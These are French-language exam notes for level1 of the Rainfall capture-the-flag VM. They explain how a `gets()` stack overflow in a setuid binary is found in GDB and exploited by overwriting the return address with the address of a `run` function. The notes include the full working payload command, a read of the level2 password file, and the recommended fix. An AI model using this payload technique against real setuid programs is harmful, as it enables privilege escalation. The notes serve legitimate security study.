# Level1 - Exam Notes

## 1. Objective
Obtenir un shell level2. Le binaire est setuid setgid level2 ; la fonction `run` exécute `system("/bin/sh")` mais n’est jamais appelée.

## 2. Initial diagnosis (before GDB)
- **Fonctions suspectes :** `gets` (lecture sans limite), `system` (cible utile). `main` alloue un buffer puis appelle `gets(buffer)`.
- **Entrée utilisateur :** tout ce qui est lu par gets dans le buffer ; pas de borne.
- **Succès :** exécuter `run` (0x08048444) qui appelle system("/bin/sh") avec euid level2.
- **Hypothèse :** buffer overflow ; écraser l’adresse de retour par l’adresse de `run`.

## 3. GDB diagnosis (how the vulnerability was found)
- **Où break :** dans `main`, après l’appel à `gets` (ex. `b *main+21` ou juste avant `leave`). But : inspecter la stack après avoir envoyé un payload de test pour mesurer l’offset.
- **Layout stack :** `info frame` puis `x/30wx $esp`. Dans main : `sub $0x50,%esp`, buffer à `esp+0x10` (lea 0x10(%esp),%eax). Donc buffer = 0x40 octets jusqu’à esp+0x4f ; saved EBP à esp+0x50 ; adresse de retour à esp+0x54. **Offset théorique** buffer → retour = 0x54 - 0x10 = 68. Sur la VM Rainfall l’offset observé est souvent **76** (alignement/compilateur différent).
- **Offset vers la cible :** envoyer 76 octets + 4 octets (ex. BBBB) ; break juste avant `ret` ; `x/wx $esp` ou regarder la valeur qui a écrasé l’adresse de retour. Si le programme segfault en 0x42424242, l’offset 76 est correct. Sinon tester 72 ou 80.
- **Adresses :** `info functions` ou `p run` → `run` à **0x08048444**. Little endian : `\x44\x84\x04\x08`.
- **Contrôle du flux :** après overflow avec 76 octets + 0x08048444, au `ret` de main, eip = 0x08048444 → exécution de run() → system("/bin/sh"). Vérifier en `ni` après le ret.

## 4. Building the exploit command
- **Cible :** adresse de retour de main ; valeur à écrire : adresse de `run` = 0x08048444.
- **Structure du payload :** [76 octets padding] + [4 octets = 0x08048444]. Le padding remplit le buffer et saved EBP ; les 4 derniers octets écrasent l’adresse de retour.
- **Encodage :** adresse en little endian : `\x44\x84\x04\x08`. Pas de \n dans le padding (gets s’arrête au \n). Python : `'print "A"*76 + "\x44\x84\x04\x08"'`.
- **Invocation :** le programme lit stdin ; après le payload, stdin se ferme et le shell quitte. Garder stdin ouvert : `( python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat ) | ./level1`. Le `cat` relaie le clavier vers le shell.
- **Référence commands.md :** commande finale dans `commands.md`, section « Exploitation », étape 4. Démo : `( python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat ) | ./level1`.

## 5. Exploitation logic
Buffer overflow via gets() : pas de borne. On écrase saved EBP puis l’adresse de retour avec l’adresse de run. Au ret de main, le flux saute vers run() → system("/bin/sh") avec euid level2.

## 6. Reproducible procedure (for evaluation)
- **Commande :** `( python -c 'print "A"*76 + "\x44\x84\x04\x08"'; cat ) | ./level1` puis `cat /home/user/level2/.pass`.
- **Résultat attendu :** « Good... Wait what? » puis shell level2.
- **À dire :** « gets() lit sans limite. J’ai mesuré en GDB l’offset jusqu’à l’adresse de retour (76 sur la VM). J’écrase la ret avec l’adresse de run pour appeler system("/bin/sh"). »

## 7. Oral defense points
- **Bug :** gets(buffer) sans limite dans un buffer de 64 octets (main, buffer à esp+0x10).
- **GDB :** confirme l’offset 76 (ou 72/80), l’adresse de run 0x08048444, et qu’au ret on saute bien vers run.
- **Payload :** 76 octets + adresse de run en LE ; pas de shellcode.
- **Fix :** remplacer gets par fgets(buffer, sizeof(buffer), stdin).

## 8. Common evaluator questions
- **Pourquoi 76 et pas 68 ?** 68 = 0x54-0x10 (théorique). Sur la VM Rainfall l’alignement donne 76 ; à vérifier en GDB avec un payload test.
- **Pourquoi run ?** C’est la seule fonction qui appelle system("/bin/sh") et qui n’est jamais appelée en flux normal.
- **À quoi sert le cat ?** Garder stdin ouvert pour que le shell reste interactif.
- **Où est le buffer ?** À esp+0x10 dans la frame de main (64 octets).
